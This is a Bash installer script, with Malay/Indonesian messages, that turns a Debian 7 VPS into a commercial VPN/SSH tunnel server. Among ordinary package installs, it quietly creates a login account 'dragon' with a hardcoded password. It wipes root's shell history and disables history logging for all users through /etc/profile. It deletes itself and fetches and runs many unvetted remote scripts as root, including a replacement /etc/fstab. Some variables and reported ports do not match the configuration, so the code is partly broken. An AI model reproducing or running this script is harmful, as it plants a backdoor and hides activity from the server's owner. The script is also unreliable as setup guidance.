#!/bin/bash

if [ $USER != 'root' ]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi

# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(wget -qO- ipv4.icanhazip.com);
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi

# go to root
cd
# go home
cd
 red='\e[1;31m'
               green='\e[0;32m'
               NC='\e[0m'

               echo -e "\e[38;5;82m Connecting to Autoscript OrangKuatsab..."
			   sleep 1

			   echo -e "\e[38;5;11m Connecting to your ip ▒▒▒▒: $myip ...."
               sleep 2
                          echo -e "\e[38;5;13m Proses ini akan mengambil masa 10-15 minit▒▒▒▒▒▒▒"
		sleep 2.5	  
			   echo -e "\e[38;5;226m IP ANDA Berjaya Di Daftarkan▒▒▒▒▒▒▒▒..."
               sleep 1.5
               
			   echo -e "${green}Mula Setup▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒${NC}"
               sleep 1
	       cd
# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

# install wget and curl
apt-get update;apt-get -y install wget curl;

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service ssh restart

# set repo
wget -O /etc/apt/sources.list "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/sources.list.debian7"
wget "http://www.dotdeb.org/dotdeb.gpg"
wget "http://www.webmin.com/jcameron-key.asc"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
cat jcameron-key.asc | apt-key add -;rm jcameron-key.asc

# remove unused
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;
#apt-get -y autoremove;

# update
apt-get update;apt-get -y upgrade;

# install webserver
apt-get -y install nginx php5-fpm php5-cli

# install essential package
echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
apt-get -y install bmon 
apt-get -y install iftop 
apt-get -y install htop 
apt-get -y install nmap 
apt-get -y install axel 
apt-get -y install nano 
apt-get -y install iptables 
apt-get -y install traceroute 
apt-get -y install sysv-rc-conf 
apt-get -y install dnsutils 
apt-get -y install bc 
apt-get -y install nethogs
apt-get -y install openvpn 
apt-get -y install vnstat 
apt-get -y install less 
apt-get -y install screen 
apt-get -y install psmisc 
apt-get -y install apt-file 
apt-get -y install whois 
apt-get -y install ptunnel 
apt-get -y install ngrep 
apt-get -y install mtr 
apt-get -y install git 
apt-get -y install zsh 
apt-get -y install mrtg 
apt-get -y install snmp 
apt-get -y install snmpd 
apt-get -y install snmp-mibs-downloader 
apt-get -y install unzip 
apt-get -y install unrar 
apt-get -y install rsyslog 
apt-get -y install debsums 
apt-get -y install rkhunter
apt-get -y install build-essential
apt-get -y --force-yes -f install libxml-parser-perl

# disable exim
service exim4 stop
sysv-rc-conf exim4 off

# update apt-file
apt-file update

# setting vnstat
vnstat -u -i $ether
vnstat -i $ether
service vnstat restart

# install neofetch
echo "deb http://dl.bintray.com/dawidd6/neofetch jessie main" | sudo tee -a /etc/apt/sources.list
curl -L "https://bintray.com/user/downloadSubjectPublicKey?username=bintray" -o Release-neofetch.key && sudo apt-key add Release-neofetch.key && rm Release-neofetch.key
apt-get update
apt-get install neofetch

# install webserver
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/SSL3/FluxoScript/master/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Welcome webserver MBAH SHONDONG Hawok Hawok Jozz</pre>" > /home/vps/public_html/index.html
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/SSL3/FluxoScript/master/vps.conf"
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
service php5-fpm restart
service nginx restart

# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget https://raw.githubusercontent.com/SSL3/FluxoScript/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/SSL3/FluxoScript/master/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/SSL3/FluxoScript/master/client.ovpn"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
cd;wget https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash dragon
echo "dragon:369" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear

cd
# install badvpn
wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/SSL3/FluxoScript/master/badvpn-udpgw"
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/SSL3/FluxoScript/master/badvpn-udpgw64"
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300

# install mrtg
#apt-get update;apt-get -y install snmpd;
wget -O /etc/snmp/snmpd.conf "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/snmpd.conf"
wget -O /root/mrtg-mem "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/mrtg-mem.sh"
chmod +x /root/mrtg-mem
cd /etc/snmp/
sed -i 's/TRAPDRUN=no/TRAPDRUN=yes/g' /etc/default/snmpd
service snmpd restart
snmpwalk -v 1 -c public localhost 1.3.6.1.4.1.2021.10.1.3.1
mkdir -p /home/vps/public_html/mrtg
cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg.cfg public@localhost
curl "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/mrtg.conf" >> /etc/mrtg.cfg
sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg.cfg
sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg.cfg
indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg.cfg
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
cd

# setting port ssh
sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
service ssh restart

# install dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 443 -p 80 -b /etc/issue.net"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
service ssh restart
service dropbear restart

# install vnstat gui
cd /home/vps/public_html/
wget https://github.com/Mbah-Shondong/Debian732/raw/master/Debian7/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
sed -i "s/\$locale = 'en_US.UTF-8';/\$locale = 'en_US.UTF+8';/g" config.php
cd

# install fail2ban
apt-get update;apt-get -y install fail2ban;service fail2ban restart;
# Instal (D)DoS Deflate
if [ -d '/usr/local/ddos' ]; then
	echo; echo; echo "Please un-install the previous version first"
	exit 0
else
	mkdir /usr/local/ddos
fi
clear
echo; echo 'Installing DOS-Deflate 0.6'; echo
echo; echo -n 'Downloading source files...'
wget -q -O /usr/local/ddos/ddos.conf http://www.inetbase.com/scripts/ddos/ddos.conf
echo -n '.'
wget -q -O /usr/local/ddos/LICENSE http://www.inetbase.com/scripts/ddos/LICENSE
echo -n '.'
wget -q -O /usr/local/ddos/ignore.ip.list http://www.inetbase.com/scripts/ddos/ignore.ip.list
echo -n '.'
wget -q -O /usr/local/ddos/ddos.sh http://www.inetbase.com/scripts/ddos/ddos.sh
chmod 0755 /usr/local/ddos/ddos.sh
cp -s /usr/local/ddos/ddos.sh /usr/local/sbin/ddos
echo '...done'
echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
echo '.....done'
echo; echo 'Installation has completed.'
echo 'Config file is at /usr/local/ddos/ddos.conf'
echo 'Please send in your comments and/or suggestions to zaf@vsnl.com'

# install squid3
apt-get -y install squid3
wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/squid3.conf"
sed -i $MYIP2 /etc/squid3/squid.conf;
service squid3 restart

# install webmin
cd
wget -O webmin-current.deb http://www.webmin.com/download/deb/webmin-current.deb
dpkg -i --force-all webmin-current.deb
apt-get -y -f install;
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
rm -f /root/webmin-current.deb
service webmin restart
service vnstat restart

# install pptp vpn
wget https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/pptp.sh
chmod +x pptp.sh
./pptp.sh

# swap ram
dd if=/dev/zero of=/swapfile bs=2048 count=2048k
# buat swap
mkswap /swapfile
# jalan swapfile
swapon /swapfile
#auto star saat reboot
wget https://raw.githubusercontent.com/BlackHand7752/-myhand03/master/fstab
mv ./fstab /etc/fstab
chmod 644 /etc/fstab
sysctl vm.swappiness=10
#permission swapfile
chown root:root /swapfile 
chmod 0600 /swapfile
cd

# download script
cd
wget -O /usr/bin/benchmark "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/benchmark.sh"
wget -O /usr/bin/speedtest "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/speedtest.py"
wget -O /usr/bin/ps_mem "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/ps_mem.py"
wget -O /etc/issue.net "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/banner"
wget -O /usr/bin/dropmon "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/dropmon.sh"
wget -O /usr/bin/menu "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/menu.sh"
wget -O /usr/bin/user-add "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-add.sh"
wget -O /usr/bin/user-add-vpn "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-add-vpn.sh"
wget -O /usr/bin/user-add-pptp "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-add-pptp.sh"
wget -O /usr/bin/user-expire "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-expire.sh"
wget -O /usr/bin/user-gen "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-gen.sh"
wget -O /usr/bin/user-limit "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-limit.sh"
wget -O /usr/bin/user-list "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-list.sh"
wget -O /usr/bin/user-login "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-login.sh"
wget -O /usr/bin/user-active-list "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-active-list.sh"
wget -O /usr/bin/user-renew "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-renew.sh"
wget -O /usr/bin/user-del "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-del.sh"
wget -O /usr/bin/user-pass "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-pass.sh"
wget -O /usr/bin/user-expire-list "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-expire-list.sh"
wget -O /usr/bin/user-banned "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-banned.sh"
wget -O /usr/bin/unbanned-user "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/unbanned-user.sh"
wget -O /usr/bin/delete-user-expire "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/delete-user-expire.sh"
echo "0 0 * * * root /usr/bin/user-expire" > /etc/cron.d/user-expire
echo "* * * * * service dropbear restart" > /etc/cron.d/dropbear
chmod +x /usr/bin/benchmark
chmod +x /usr/bin/speedtest
chmod +x /usr/bin/ps_mem
chmod +x /usr/bin/dropmon
chmod +x /usr/bin/menu
chmod +x /usr/bin/user-add
chmod +x /usr/bin/user-add-vpn
chmod +x /usr/bin/user-add-pptp
chmod +x /usr/bin/user-expire
chmod +x /usr/bin/user-gen
chmod +x /usr/bin/user-limit
chmod +x /usr/bin/user-list
chmod +x /usr/bin/user-login
chmod +x /usr/bin/user-active-list
chmod +x /usr/bin/user-renew
chmod +x /usr/bin/user-del
chmod +x /usr/bin/user-pass
chmod +x /usr/bin/user-expire-list
chmod +x /usr/bin/user-banned
chmod +x /usr/bin/unbanned-user
chmod +x /usr/bin/delete-user-expire

# finishing
chown -R www-data:www-data /home/vps/public_html
service cron restart
service nginx start
service php5-fpm start
service vnstat restart
service snmpd restart
service ssh restart
service dropbear restart
service fail2ban restart
service squid3 restart
service webmin restart
cd
clear
rm -f /root/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile
cd
red='\e[1;31m'
               green='\e[0;32m'
               NC='\e[0m'
               echo -e "\e[38;5;82m KAMI TENGAH BUAT KIRAAN VPS ANDA..."
			   sleep 1
			   echo -e "\e[38;5;11m▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 3...."
               sleep 2
                          echo -e "\e[38;5;13m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 2"
		sleep 2.5	  
			   echo -e "\e[38;5;226m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 1..."
               sleep 1.5
               
			   echo -e "${green}SUDAH BERJAYA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒${NC}"
               sleep 1
cd
## info
echo ""  | tee -a log-install.txt
echo -e "\e[38;5;9m☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ PREMIUM SERVER ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆\e[0m" 
echo -e "\e[38;5;9m                      Copyright orangkuatsabahanterkini                \e[0m" 
echo -e "\e[38;5;9m                      https://t.me/orangkuatsabahanterkini              \e[0m"  
echo -e "\e[38;5;197m☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆\e[0m" 
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript OrangKuatSabahanTerkini (OrangKuatSabahanTerkini SCRIPT 2017)"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt 
echo ""  | tee -a log-install.txt
echo -e "\e[38;5;214mnginx\e[38;5;13m http://$myip:80\e[0m"   | tee -a log-install.txt 
echo -e "\e[38;5;214mWebmin\e[38;5;13m http://$myip:10000/\e[0m"  | tee -a log-install.txt 
echo -e "\e[38;5;214mSquid3\e[38;5;13m 8080\e[0m" | tee -a log-install.txt 
echo -e "\e[38;5;214mOpenSSH\e[38;5;13m 22\e[0m"  | tee -a log-install.txt
echo -e "\e[38;5;214mDropbear\e[38;5;13m 109'110'442\e[0m"  | tee -a log-install.txt
echo -e "\e[38;5;214mSSL\e[38;5;13m 443\e[0m" | tee -a log-install.txt 
echo -e "\e[38;5;214mOpenVPN\e[38;5;13m IP/client.ovpn\e[0m"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt 
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt 
echo "Menu : type menu to check menu script"  | tee -a log-install.txt 
echo ""  | tee -a log-install.txt | lolcat
echo "----------------------------------------" 
echo "LOG INSTALL  --> /root/log-install.txt" 
echo "----------------------------------------"
echo "▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒"  | tee -a log-install.txt
echo "      PLEASE REBOOT TO TAKE EFFECT !" | lolcat
echo "▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
cd ~/
rm -f /root/mrtg-mem
rm -f /root/pptp.sh
rm -f /root/dropbear-2016.74.tar.bz2
rm -rf /root/dropbear-2016.74
rm -f /root/debiannnn7.sh
